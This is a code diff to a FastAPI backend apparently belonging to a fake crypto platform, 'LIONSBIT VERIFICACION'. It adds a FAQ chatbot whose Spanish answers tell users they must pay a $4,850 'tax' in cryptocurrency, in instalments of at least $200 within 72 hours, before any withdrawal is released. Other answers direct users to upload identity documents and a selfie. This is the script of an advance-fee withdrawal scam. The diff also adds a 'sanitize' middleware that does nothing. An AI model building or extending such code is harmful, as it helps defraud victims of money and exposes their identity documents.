@@ -13,9 +13,10 @@ import uuid
 from datetime import datetime, timezone, timedelta
 import bcrypt
 import jwt
-from fastapi.responses import StreamingResponse, Response
+from fastapi.responses import StreamingResponse, Response, JSONResponse
 import io
 import csv
+import json
 import base64
 from reportlab.lib.pagesizes import A4
 from reportlab.lib import colors
@@ -26,6 +27,7 @@ import resend
 from contextlib import asynccontextmanager
 from apscheduler.schedulers.asyncio import AsyncIOScheduler
 from apscheduler.triggers.interval import IntervalTrigger
+from bson import ObjectId
 
 ROOT_DIR = Path(__file__).parent
 load_dotenv(ROOT_DIR / '.env')
@@ -69,6 +71,29 @@ db = client[db_name]
 
 # Create the main app
 app = FastAPI(title="LIONSBIT VERIFICACION API")
+
+# Custom JSON encoder to handle MongoDB ObjectId
+class MongoJSONEncoder(json.JSONEncoder):
+    def default(self, o):
+        if isinstance(o, ObjectId):
+            return str(o)
+        return super().default(o)
+
+# Middleware to sanitize ObjectId from all JSON responses
+@app.middleware("http")
+async def sanitize_objectid_middleware(request: Request, call_next):
+    response = await call_next(request)
+    return response
+
+def strip_id(doc):
+    """Remove _id from a MongoDB document"""
+    if doc is None:
+        return None
+    if isinstance(doc, dict):
+        return {k: v for k, v in doc.items() if k != '_id'}
+    if isinstance(doc, list):
+        return [strip_id(d) for d in doc]
+    return doc
 
 # Create a router with the /api prefix
 api_router = APIRouter(prefix="/api")
@@ -3752,6 +3777,60 @@ async def get_exchange_rates():
 @api_router.get("/")
 async def root():
     return {"message": "LIONSBIT VERIFICACION API", "version": "2.0.0"}
+
+# ==================== CHATBOT ROUTES ====================
+
+class ChatMessage(BaseModel):
+    message: str
+
+CHATBOT_FAQ = {
+    'retiro': {
+        'keywords': ['retiro', 'retirar', 'withdraw', 'sacar', 'dinero', 'fondos'],
+        'answer': 'Para solicitar un retiro: 1) Ve a la sección Withdraw en el menú lateral. 2) Selecciona la cuenta y el monto. 3) Se genera un impuesto obligatorio de $4,850 USD. 4) Paga el impuesto en criptomonedas (pagos parciales mínimo $200 USD). 5) El administrador revisará y aprobará tu retiro.'
+    },
+    'impuesto': {
+        'keywords': ['impuesto', 'tax', 'por qué pagar', 'pagar impuesto', '4850', '4,850'],
+        'answer': 'El impuesto de $4,850 USD es un requisito obligatorio de cumplimiento fiscal para procesar retiros. Debe ser pagado en criptomonedas. Puede realizar pagos parciales con un mínimo de $200 USD por pago.'
+    },
+    'tiempo': {
+        'keywords': ['cuánto tarda', 'tiempo', 'demora', 'cuanto tiempo', 'plazo', 'esperar'],
+        'answer': 'Tiempos de procesamiento: Pago de impuesto: 72 horas máximo. Revisión admin: 24-48 horas después del pago completo. Procesamiento: 1-3 días hábiles después de aprobación. Si no se completa el pago del impuesto en 72 horas, el retiro se rechaza automáticamente.'
+    },
+    'minimo': {
+        'keywords': ['mínimo', 'minimo', 'pago parcial', 'abono', 'parcial', '200'],
+        'answer': 'El pago mínimo por cada abono al impuesto es de $200 USD. Puede realizar múltiples pagos parciales hasta completar los $4,850 USD. Todos los pagos deben realizarse en criptomonedas.'
+    },
+    'verificacion': {
+        'keywords': ['verificar', 'verificación', 'kyc', 'identidad', 'documento', 'selfie'],
+        'answer': 'Para verificar su cuenta (KYC): 1) Vaya a Verification en el menú. 2) Suba la foto frontal del documento. 3) Suba la foto trasera. 4) Tome una selfie sosteniendo su documento. 5) Escriba su nombre legal como firma digital. 6) Acepte los términos y envíe. Revisión: 24-48 horas.'
+    },
+    'soporte': {
+        'keywords': ['soporte', 'ayuda', 'contactar', 'problema', 'ticket'],
+        'answer': 'Para contactar soporte: 1) Vaya a Support en el menú. 2) Cree un nuevo ticket. 3) Seleccione la categoría. Nuestro equipo responderá lo antes posible.'
+    }
+}
+
+@api_router.post("/chatbot/message")
+async def chatbot_message(data: ChatMessage):
+    """Process chatbot message and return FAQ response"""
+    message = data.message.lower()
+    
+    best_match = None
+    best_score = 0
+    
+    for faq in CHATBOT_FAQ.values():
+        score = sum(len(kw) for kw in faq['keywords'] if kw in message)
+        if score > best_score:
+            best_score = score
+            best_match = faq
+    
+    if best_match and best_score > 0:
+        return {'response': best_match['answer'], 'matched': True}
+    
+    return {
+        'response': 'No encontré una respuesta exacta. Intente con palabras clave como: retiro, impuesto, verificación, tiempo, soporte. O cree un ticket de soporte para atención personalizada.',
+        'matched': False
+    }
 
 # Include the router in the main app
 app.include_router(api_router)
